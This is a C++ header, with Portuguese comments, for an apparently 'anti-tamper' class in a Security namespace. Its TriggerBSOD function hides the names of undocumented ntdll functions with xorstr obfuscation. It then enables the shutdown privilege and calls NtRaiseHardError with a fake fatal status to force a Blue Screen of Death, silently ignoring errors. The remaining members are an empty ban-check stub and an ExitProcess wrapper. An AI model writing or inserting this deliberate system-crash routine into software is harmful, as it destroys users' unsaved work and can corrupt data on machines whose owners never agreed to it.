#pragma once
#include <windows.h>
#include <ntstatus.h>
#include <Security/xorstr.hpp>

namespace Security
{
	// Typedefs para funções não documentadas do ntdll
	typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(
		ULONG Privilege,
		BOOLEAN Enable,
		BOOLEAN CurrentThread,
		PBOOLEAN Enabled
	);

	typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(
		NTSTATUS ErrorStatus,
		ULONG NumberOfParameters,
		ULONG UnicodeStringParameterMask,
		PULONG_PTR *Parameters,
		ULONG ValidResponseOption,
		PULONG Response
	);

	class cAntiTamper
	{
	private:
		static constexpr ULONG SHUTDOWN_PRIVILEGE = 19;
		static constexpr NTSTATUS HARD_ERROR = 0xDEADDEAD;
		static constexpr ULONG VALID_RESPONSE = 6;

	public:
		// Causa BSOD (Blue Screen of Death)
		inline static void TriggerBSOD()
		{
			try
			{
				HMODULE hNtdll = GetModuleHandle(xorstr("ntdll.dll"));

				if (!hNtdll)
					return;

				// Obter função RtlAdjustPrivilege
				TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege =
					(TFNRtlAdjustPrivilege)GetProcAddress(
						hNtdll,
						xorstr("RtlAdjustPrivilege")
					);

				if (!pfnRtlAdjustPrivilege)
					return;

				// Obter função NtRaiseHardError
				TFNNtRaiseHardError pfnNtRaiseHardError =
					(TFNNtRaiseHardError)GetProcAddress(
						hNtdll,
						xorstr("NtRaiseHardError")
					);

				if (!pfnNtRaiseHardError)
					return;

				NTSTATUS statusPrivilege, statusError;
				BOOLEAN bEnabled;
				ULONG uResponse;

				// Habilitar privilégio de shutdown (necessário para BSOD)
				// Privilege 19 = SE_SHUTDOWN_PRIVILEGE
				statusPrivilege = pfnRtlAdjustPrivilege(
					SHUTDOWN_PRIVILEGE,
					TRUE,
					FALSE,
					&bEnabled
				);

				// Se conseguir habilitar o privilégio, trigger BSOD
				if (statusPrivilege == STATUS_SUCCESS)
				{
					// Trigger BSOD com NtRaiseHardError
					statusError = pfnNtRaiseHardError(
						HARD_ERROR,
						0,
						0,
						nullptr,
						VALID_RESPONSE,
						&uResponse
					);
				}
			}
			catch (const std::exception&)
			{
				// Silenciosamente ignorar exceções
			}
		}

		// Função alternativa: fazer crash limpo sem BSOD

		// Verifica se usuário é banido e executa ação
		inline static void CheckBanStatus()
		{
		}

		// Função para terminar processo com código específico
		inline static void ExitWithCode(UINT exitCode = 0xDEADDEAD)
		{
			ExitProcess(exitCode);
		}
	};
}
